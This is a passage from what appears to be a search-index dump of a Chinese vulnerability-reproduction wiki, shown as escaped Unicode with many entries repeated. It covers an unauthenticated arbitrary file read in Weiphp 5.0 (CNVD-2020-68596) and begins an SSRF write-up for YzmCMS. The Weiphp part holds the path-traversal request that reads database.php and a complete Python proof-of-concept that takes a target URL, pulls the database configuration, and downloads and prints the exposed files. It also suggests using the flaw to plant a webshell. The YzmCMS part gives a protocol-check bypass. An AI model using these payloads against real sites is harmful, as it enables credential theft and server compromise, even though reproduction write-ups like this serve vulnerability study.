\u6765\u5199\u5165\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u5230\u56fe\u7247\u4e2d /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php \u67e5\u770b\u76ee\u5f55**/public/uploads/picture/**\uff0c\u5e76\u7528\u8bb0\u4e8b\u672c\u6253\u5f00\u5199\u5165\u7684jpg\u6587\u4ef6 \u5f97\u5230\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u7684\u4fe1\u606f\uff0c\u65e2\u7136\u8fd9\u4e2a\u53d8\u91cf\u53ef\u63a7\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u65b9\u6cd5\u4e0b\u8f7d\u6728\u9a6c\u6587\u4ef6\uff0c\u518d\u901a\u8fc7\u89e3\u6790\u6f0f\u6d1e\u6216\u8005\u6587\u4ef6\u5305\u542b\u7b49\u5176\u4ed6\u6f0f\u6d1e\u6765getshell \u5728\u5f53\u524d\u6761\u4ef6\u4e0b\u5e76\u4e0d\u77e5\u9053\u6587\u4ef6\u540d\u662f\u4ec0\u4e48\uff0c\u6240\u4ee5\u56de\u5230\u4ee3\u7801\u4e2d\u7ee7\u7eed\u5bfb\u627e\u53ef\u4ee5\u83b7\u53d6\u6587\u4ef6\u540d\u7684\u529e\u6cd5 if ($res) { $file = array( 'name' => $picName, 'type' => 'application/octet-stream', 'tmp_name' => $picPath, 'size' => $res, 'error' => 0 ); $File = D('home/Picture'); $cover_id = $File->addFile($file); } \u5411\u4e0b\u8ddf\u8fdb addFile \u51fd\u6570 \u51fd\u6570\u4f4d\u7f6e: application\\home\\model\\Picture.php function addFile($file) { $data['md5'] = md5_file($file['tmp_name']); $id = $this->where('md5', $data['md5'])->value('id'); if ($id > 0) { return $id; } $info = pathinfo($file['tmp_name']); $data['path'] = str_replace(SITE_PATH . '/public', '', $file['tmp_name']); $data['sha1'] = hash_file('sha1', $file['tmp_name']); $data['create_time'] = NOW_TIME; $data['status'] = 1; $data['wpid'] = get_wpid(); $id = $this->insertGetId($data); return $id; } \u53ef\u4ee5\u770b\u5230\u8fd9\u90e8\u5206\u4ee3\u7801\u5199\u5165\u4e86 Picture \u8868\u4e2d $id = $this->insertGetId($data); \u6211\u4eec\u67e5\u770b\u4e00\u4e0b\u6570\u636e\u5e93\u7684\u8fd9\u4e2a\u6570\u636e\u8868\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e4b\u524d\u6240\u4e0a\u4f20\u7684\u6570\u636e\u5168\u90e8\u7f13\u5b58\u5728\u8fd9\u4e2a\u8868\u91cc\u4e86 \u6211\u4eec\u73b0\u5728\u5219\u9700\u8981\u627e\u5230\u4e0d\u9700\u8981\u767b\u5f55\u7684\u5730\u65b9\u6765\u83b7\u5f97\u8fd9\u4e9b\u6570\u636e\uff0c\u6240\u4ee5\u53ef\u4ee5\u5168\u5c40\u53bb\u67e5\u627e\u8c03\u7528\u4e86\u8fd9\u4e2a Picture \u8868\u7684\u5730\u65b9 \u627e\u5230\u4e00\u5904\u53ef\u4ee5\u5229\u7528\u7684\u5730\u65b9 function user_pics() { $map['wpid'] = get_wpid(); $picList = M('Picture')->where(wp_where($map)) ->order('id desc') ->select(); $this->assign('picList', $picList); exit($this->fetch()); } \u8ddf\u8fdb get_wpid \u51fd\u6570 function get_wpid($wpid = '') { if (defined('WPID')) { return WPID; } else { return 0; } } \u67e5\u770b WPID \u7684\u5b9a\u4e49\uff0c\u6587\u4ef6\u4f4d\u7f6e\u5728**config\\weiphp_define.php** \u5b9a\u4e49\u503c\u9ed8\u8ba4\u4e3a 1\uff0c\u6240\u4ee5\u8fd9\u91cc\u8c03\u7528\u5219\u53ef\u4ee5\u83b7\u5f97\u6570\u636e\u5e93\u4e2dPictrue\u8868\u7684\u5185\u5bb9\uff0c\u95f4\u63a5\u7684\u77e5\u9053\u4e86\u6587\u4ef6\u5185\u5bb9\u4ee5\u53ca\u6587\u4ef6\u540d \u8bbf\u95ee\u5730\u5740: http://webphp/public/index.php/home/file/user_pids \u53ef\u4ee5\u770b\u5230\u6587\u4ef6\u540d\uff0c\u6839\u636eurl\u5730\u5740\u8bbf\u95ee\u9009\u62e9\u4e0b\u8f7d\u5373\u53ef \u6f0f\u6d1e\u5229\u7528POC \u00b6 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import random import re def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) \\ 033 [ 0 m ') print ( '+ \\033 [34mVersion: Weiphp5.0 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): upload_url = target_url + \"/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } data = { \"1\" : 1 } try : response = requests . post ( url = upload_url , headers = headers , data = data , timeout = 20 ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u6210\u529f\u5c06 database.php\u6587\u4ef6 \u5199\u5165Pictrue\u8868\u4e2d \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) def POC_2 ( target_url ): vnln_url = target_url + \"/public/index.php/home/file/user_pics\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try : response = requests . get ( url = vnln_url , headers = headers ) . text href = re . findall ( r '<img src=\"(.*?)\"' , response ) for i in href : print ( \" \\033 [32m[o] \u5f97\u5230\u654f\u611f\u6587\u4ef6url\uff1a {} \\033 [0m\" . format ( i )) data = requests . get ( url = i , headers = headers ) path = str ( random . randint ( 1 , 999 )) + '.php' with open ( path , 'wb' ) as f : f . write ( data . content ) print ( \" \\033 [32m[o] \u6210\u529f\u4e0b\u8f7d\u6587\u4ef6\u4e3a\uff1a {} \\033 [0m\" . format ( path )) print ( \" \\033 [32m[o] \u6587\u4ef6\u5185\u5bb9\u4e3a\uff1a \\n\\033 [0m {} \" . format ( data . text )) except : print ( \" \\033 [31m[x] \u83b7\u53d6\u6587\u4ef6\u540d\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) image_url = POC_2 ( target_url )","title":"Weiphp5.0 \u524d\u53f0\u6587\u4ef6\u4efb\u610f\u8bfb\u53d6 CNVD-2020-68596"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596/#weiphp50-\u524d\u53f0\u6587\u4ef6\u4efb\u610f\u8bfb\u53d6-cnvd-2020-68596","text":"","title":"Weiphp5.0 \u524d\u53f0\u6587\u4ef6\u4efb\u610f\u8bfb\u53d6 CNVD-2020-68596"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Weiphp5.0 \u5b58\u5728\u524d\u53f0\u6587\u4ef6\u4efb\u610f\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u8bfb\u53d6\u6570\u636e\u5e93\u914d\u7f6e\u7b49\u654f\u611f\u6587\u4ef6","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Weiphp <= 5.0","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596/#\u73af\u5883\u642d\u5efa","text":"weiphp5.0\u5b98\u65b9\u4e0b\u8f7d\u53c2\u8003\u624b\u518c \u53c2\u8003\u5b98\u65b9\u624b\u518c\u521b\u5efa\u7f51\u7ad9\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6f0f\u6d1e\u51fd\u6570\u6587\u4ef6: application\\material\\controller\\Material.php \u6f0f\u6d1e\u51fd\u6570: _download_imgage public function _download_imgage($media_id, $picUrl = '', $dd = null) { $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d'); mkdirs($savePath); $cover_id = 0; if (empty($picUrl)) { // \u83b7\u53d6\u56fe\u7247URL $url = 'https://api.weixin.qq.com/cgi-bin/material/get_material?access_token=' . get_access_token(); $param['media_id'] = $media_id; // dump($url); $picContent = post_data($url, $param, 'json', false); $picjson = json_decode($picContent, true); // dump($picjson);die; if (isset($picjson['errcode']) && $picjson['errcode'] != 0) { $cover_id = do_down_image($media_id, $dd['thumb_url']); if (!$cover_id) { return 0; exit(); } } $picName = NOW_TIME . uniqid() . '.jpg'; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $picContent); } else { $content = wp_file_get_contents($picUrl); // \u83b7\u53d6\u56fe\u7247\u6269\u5c55\u540d $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); if (!$res) { $cover_id = do_down_image($media_id); if (!$cover_id) { return 0; exit(); } } } if ($res) { $file = array( 'name' => $picName, 'type' => 'application/octet-stream', 'tmp_name' => $picPath, 'size' => $res, 'error' => 0 ); $File = D('home/Picture'); $cover_id = $File->addFile($file); } return $cover_id; } \u9996\u5148\u6ce8\u610f\u5230\u51fd\u6570\u7684\u6807\u8bc6\u4e3a**public**\uff0c\u4e5f\u5c31\u662f\u8fd9\u4e2a\u51fd\u6570\u662f\u516c\u5171\u8c03\u7528\u7684\uff0c\u5e76\u4e14\u53d8\u91cf**picUrl**\u4e3a\u53ef\u63a7\u53d8\u91cf \u6839\u636e\u4ee3\u7801\u4ece\u4e0a\u5411\u4e0b\u5206\u6790 $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d'); \u53d8\u91cf$savePath**\u786e\u5b9a\u6587\u4ef6\u4e0a\u4f20\u540e\u7684\u7f13\u5b58\u4f4d\u7f6e\u4e3a /public/uploads/picture/ \uff0c\u5e76\u6309\u7167**\u5e74-\u6708-\u65e5 \u521b\u5efa\u6587\u4ef6\u5939 \u5411\u4e0b\u5bf9\u53d8\u91cf**$picUrl** \u662f\u5426\u4e3a\u7a7a\u8fdb\u884c\u5224\u65ad\uff0c\u5e76\u5224\u65ad\u662f\u5426\u8fdb\u884c\u767b\u5f55\uff0c\u8fd9\u91cc\u4f7f\u7528**POST**\u4f20\u53c2\u8fdb\u884c\u9a8c\u8bc1\u767b\u5f55\u7ed5\u8fc7\uff0c\u8df3\u8f6c\u5230else\u8bed\u53e5\u4e0b else { $content = wp_file_get_contents($picUrl); // \u83b7\u53d6\u56fe\u7247\u6269\u5c55\u540d $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); if (!$res) { $cover_id = do_down_image($media_id); if (!$cover_id) { return 0; exit(); } } \u5206\u6790\u4f20\u5165\u53d8\u91cf picUrl \u7684 **wp_file_get_contents**\u65b9\u6cd5 $content = wp_file_get_contents($picUrl); \u51fd\u6570\u6587\u4ef6\u4f4d\u7f6e application\\common.php \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u6ca1\u6709\u5bf9\u6211\u4eec\u7684\u53c2\u6570\u8fdb\u884c\u8fc7\u6ee4\uff0c\u53ea\u505a\u4e86\u4e00\u4e2a\u6709\u5173\u8d85\u65f6\u7684\u64cd\u4f5c, \u56de\u5230\u51fd\u6570\u7ee7\u7eed\u5411\u4e0b\u5206\u6790 $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); \u8fd9\u91cc\u521b\u5efa\u4e86\u6709\u5173\u5f53\u524d\u65f6\u95f4\u7684\u56fe\u7247\u6587\u4ef6\uff0c\u5e76\u5199\u5165\u6587\u4ef6\u5939**/public/uploads/picture/** \u4e0b \u6211\u4eec\u5148\u5c1d\u8bd5\u63a7\u5236\u53d8\u91cf $picUrl \u6765\u5199\u5165\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u5230\u56fe\u7247\u4e2d /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php \u67e5\u770b\u76ee\u5f55**/public/uploads/picture/**\uff0c\u5e76\u7528\u8bb0\u4e8b\u672c\u6253\u5f00\u5199\u5165\u7684jpg\u6587\u4ef6 \u5f97\u5230\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u7684\u4fe1\u606f\uff0c\u65e2\u7136\u8fd9\u4e2a\u53d8\u91cf\u53ef\u63a7\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u65b9\u6cd5\u4e0b\u8f7d\u6728\u9a6c\u6587\u4ef6\uff0c\u518d\u901a\u8fc7\u89e3\u6790\u6f0f\u6d1e\u6216\u8005\u6587\u4ef6\u5305\u542b\u7b49\u5176\u4ed6\u6f0f\u6d1e\u6765getshell \u5728\u5f53\u524d\u6761\u4ef6\u4e0b\u5e76\u4e0d\u77e5\u9053\u6587\u4ef6\u540d\u662f\u4ec0\u4e48\uff0c\u6240\u4ee5\u56de\u5230\u4ee3\u7801\u4e2d\u7ee7\u7eed\u5bfb\u627e\u53ef\u4ee5\u83b7\u53d6\u6587\u4ef6\u540d\u7684\u529e\u6cd5 if ($res) { $file = array( 'name' => $picName, 'type' => 'application/octet-stream', 'tmp_name' => $picPath, 'size' => $res, 'error' => 0 ); $File = D('home/Picture'); $cover_id = $File->addFile($file); } \u5411\u4e0b\u8ddf\u8fdb addFile \u51fd\u6570 \u51fd\u6570\u4f4d\u7f6e: application\\home\\model\\Picture.php function addFile($file) { $data['md5'] = md5_file($file['tmp_name']); $id = $this->where('md5', $data['md5'])->value('id'); if ($id > 0) { return $id; } $info = pathinfo($file['tmp_name']); $data['path'] = str_replace(SITE_PATH . '/public', '', $file['tmp_name']); $data['sha1'] = hash_file('sha1', $file['tmp_name']); $data['create_time'] = NOW_TIME; $data['status'] = 1; $data['wpid'] = get_wpid(); $id = $this->insertGetId($data); return $id; } \u53ef\u4ee5\u770b\u5230\u8fd9\u90e8\u5206\u4ee3\u7801\u5199\u5165\u4e86 Picture \u8868\u4e2d $id = $this->insertGetId($data); \u6211\u4eec\u67e5\u770b\u4e00\u4e0b\u6570\u636e\u5e93\u7684\u8fd9\u4e2a\u6570\u636e\u8868\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e4b\u524d\u6240\u4e0a\u4f20\u7684\u6570\u636e\u5168\u90e8\u7f13\u5b58\u5728\u8fd9\u4e2a\u8868\u91cc\u4e86 \u6211\u4eec\u73b0\u5728\u5219\u9700\u8981\u627e\u5230\u4e0d\u9700\u8981\u767b\u5f55\u7684\u5730\u65b9\u6765\u83b7\u5f97\u8fd9\u4e9b\u6570\u636e\uff0c\u6240\u4ee5\u53ef\u4ee5\u5168\u5c40\u53bb\u67e5\u627e\u8c03\u7528\u4e86\u8fd9\u4e2a Picture \u8868\u7684\u5730\u65b9 \u627e\u5230\u4e00\u5904\u53ef\u4ee5\u5229\u7528\u7684\u5730\u65b9 function user_pics() { $map['wpid'] = get_wpid(); $picList = M('Picture')->where(wp_where($map)) ->order('id desc') ->select(); $this->assign('picList', $picList); exit($this->fetch()); } \u8ddf\u8fdb get_wpid \u51fd\u6570 function get_wpid($wpid = '') { if (defined('WPID')) { return WPID; } else { return 0; } } \u67e5\u770b WPID \u7684\u5b9a\u4e49\uff0c\u6587\u4ef6\u4f4d\u7f6e\u5728**config\\weiphp_define.php** \u5b9a\u4e49\u503c\u9ed8\u8ba4\u4e3a 1\uff0c\u6240\u4ee5\u8fd9\u91cc\u8c03\u7528\u5219\u53ef\u4ee5\u83b7\u5f97\u6570\u636e\u5e93\u4e2dPictrue\u8868\u7684\u5185\u5bb9\uff0c\u95f4\u63a5\u7684\u77e5\u9053\u4e86\u6587\u4ef6\u5185\u5bb9\u4ee5\u53ca\u6587\u4ef6\u540d \u8bbf\u95ee\u5730\u5740: http://webphp/public/index.php/home/file/user_pids \u53ef\u4ee5\u770b\u5230\u6587\u4ef6\u540d\uff0c\u6839\u636eurl\u5730\u5740\u8bbf\u95ee\u9009\u62e9\u4e0b\u8f7d\u5373\u53ef","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596/#\u6f0f\u6d1e\u5229\u7528poc","text":"#!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import random import re def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) \\ 033 [ 0 m ') print ( '+ \\033 [34mVersion: Weiphp5.0 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): upload_url = target_url + \"/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } data = { \"1\" : 1 } try : response = requests . post ( url = upload_url , headers = headers , data = data , timeout = 20 ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u6210\u529f\u5c06 database.php\u6587\u4ef6 \u5199\u5165Pictrue\u8868\u4e2d \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) def POC_2 ( target_url ): vnln_url = target_url + \"/public/index.php/home/file/user_pics\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try : response = requests . get ( url = vnln_url , headers = headers ) . text href = re . findall ( r '<img src=\"(.*?)\"' , response ) for i in href : print ( \" \\033 [32m[o] \u5f97\u5230\u654f\u611f\u6587\u4ef6url\uff1a {} \\033 [0m\" . format ( i )) data = requests . get ( url = i , headers = headers ) path = str ( random . randint ( 1 , 999 )) + '.php' with open ( path , 'wb' ) as f : f . write ( data . content ) print ( \" \\033 [32m[o] \u6210\u529f\u4e0b\u8f7d\u6587\u4ef6\u4e3a\uff1a {} \\033 [0m\" . format ( path )) print ( \" \\033 [32m[o] \u6587\u4ef6\u5185\u5bb9\u4e3a\uff1a \\n\\033 [0m {} \" . format ( data . text )) except : print ( \" \\033 [31m[x] \u83b7\u53d6\u6587\u4ef6\u540d\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) image_url = POC_2 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/YzmCMS/YzmCMS%20Version%20%20%E5%B0%8F%E4%BA%8EV5.8%E6%AD%A3%E5%BC%8F%E7%89%88%20%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97%20SSRF%E6%BC%8F%E6%B4%9E/","text":"YzmCMS version < V5.8\u6b63\u5f0f\u7248 \u540e\u53f0\u91c7\u96c6\u6a21\u5757 SSRF\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 YzmCMS\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf \u662f\u4e00\u6b3e**\u8f7b\u91cf\u7ea7\u5f00\u6e90\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf**\uff0c\u5b83\u91c7\u7528\u81ea\u4e3b\u7814\u53d1\u7684\u6846\u67b6**YZMPHP**\u5f00\u53d1\u3002\u7a0b\u5e8f\u57fa\u4e8ePHP+Mysql\u67b6\u6784\uff0c\u5e76\u91c7\u7528MVC\u6846\u67b6\u5f0f\u5f00\u53d1\u7684\u4e00\u6b3e\u9ad8\u6548\u5f00\u6e90\u7684\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf\uff0c\u53ef\u8fd0\u884c\u5728Linux\u3001Windows\u3001MacOSX\u3001Solaris\u7b49\u5404\u79cd\u5e73\u53f0\u4e0a\u3002 \u6e90\u7801\u5b58\u5728\u534f\u8bae\u8bc6\u522b\u7684\u7f3a\u9677\uff0c\u5bfc\u81f4\u5b58\u5728SSRF\u6f0f\u6d1e \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] YzmCMS version < V5.8\u6b63\u5f0f\u7248 \u73af\u5883\u642d\u5efa \u00b6 https://github.com/yzmcms/yzmcms \u6309\u7167\u6587\u6863\u5b89\u88c5\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u540e\u53f0 \u2192 \u6a21\u5757\u7ba1\u7406 \u2192 \u91c7\u96c6\u7ba1\u7406 \u6dfb\u52a0\u91c7\u96c6\u89c4\u5219 \u5728\u4f60\u7684\u670d\u52a1\u5668\u4e0a\u7f16\u8f91HTML\u4ee3\u7801 [!NOTE] \u6839\u76ee\u5f55\u53ef\u80fd\u4e0d\u540c\uff0cpayload\u9700\u8981\u66f4\u6539 \u70b9\u51fb\u91c7\u96c6\u8bfb\u53d6\u6839\u76ee\u5f55\u4e0b\u7684 Flag \u51fa\u73b0\u6f0f\u6d1e\u7684\u4ee3\u7801\u4f4d\u7f6e yzmcms/yzmphp/core/class/cache_factory.class.php \u8fd9\u91cc\u8c03\u7528 url_check \u51fd\u6570 \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u53ea\u68c0\u6d4b\u4e86\u524d4\u4f4d\u662f\u5426\u4e3a http\uff0c\u4f7f\u7528 httpxxx \u5373\u53ef\u7ed5\u8fc7 \u53c2\u8003\u6587\u7ae0 \u00b6 There are SSRF vulnerabilities in background collection management","title":"YzmCMS Version  \u5c0f\u4e8eV5.8\u6b63\u5f0f\u7248 \u540e\u53f0\u91c7\u96c6\u6a21\u5757 SSRF\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/YzmCMS/YzmCMS%20Version%20%20%E5%B0%8F%E4%BA%8EV5.8%E6%AD%A3%E5%BC%8F%E7%89%88%20%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97%20SSRF%E6%BC%8F%E6%B4%9E/#yzmcms-version---v58\u6b63\u5f0f\u7248-\u540e\u53f0\u91c7\u96c6\u6a21\u5757-ssrf\u6f0f\u6d1e","text":"","title":"YzmCMS version &lt;  V5.8\u6b63\u5f0f\u7248 \u540e\u53f0\u91c7\u96c6\u6a21\u5757 SSRF\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/YzmCMS/YzmCMS%20Version%20%20%E5%B0%8F%E4%BA%8EV5.8%E6%AD%A3%E5%BC%8F%E7%89%88%20%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97%20SSRF%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"YzmCMS\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf \u662f\u4e00\u6b3e**\u8f7b\u91cf\u7ea7\u5f00\u6e90\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf**\uff0c\u5b83\u91c7\u7528\u81ea\u4e3b\u7814\u53d1\u7684\u6846\u67b6**YZMPHP**\u5f00\u53d1\u3002\u7a0b\u5e8f\u57fa\u4e8ePHP+Mysql\u67b6\u6784\uff0c\u5e76\u91c7\u7528MVC\u6846\u67b6\u5f0f\u5f00\u53d1\u7684\u4e00\u6b3e\u9ad8\u6548\u5f00\u6e90\u7684\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf\uff0c\u53ef\u8fd0\u884c\u5728Linux\u3001Windows\u3001MacOSX\u3001Solaris\u7b49\u5404\u79cd\u5e73\u53f0\u4e0a\u3002 \u6e90\u7801\u5b58\u5728\u534f\u8bae\u8bc6\u522b\u7684\u7f3a\u9677\uff0c\u5bfc\u81f4\u5b58\u5728SSRF\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/YzmCMS/YzmCMS%20Version%20%20%E5%B0%8F%E4%BA%8EV5.8%E6%AD%A3%E5%BC%8F%E7%89%88%20%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97%20SSRF%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] YzmCMS version < V5.8\u6b63\u5f0f\u7248","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/YzmCMS/YzmCMS%20Version%20%20%E5%B0%8F%E4%BA%8EV5.8%E6%AD%A3%E5%BC%8F%E7%89%88%20%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97%20SSRF%E6%BC%8F%E6%B4%9E/#\u73af\u5883\u642d\u5efa","text":"https://github.com/yzmcms/yzmcms \u6309\u7167\u6587\u6863\u5b89\u88c5\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/YzmCMS/YzmCMS%20Version%20%20%E5%B0%8F%E4%BA%8EV5.8%E6%AD%A3%E5%BC%8F%E7%89%88%20%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97%20SSRF%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u540e\u53f0 \u2192 \u6a21\u5757\u7ba1\u7406 \u2192 \u91c7\u96c6\u7ba1\u7406 \u6dfb\u52a0\u91c7\u96c6\u89c4\u5219 \u5728\u4f60\u7684\u670d\u52a1\u5668\u4e0a\u7f16\u8f91HTML\u4ee3\u7801 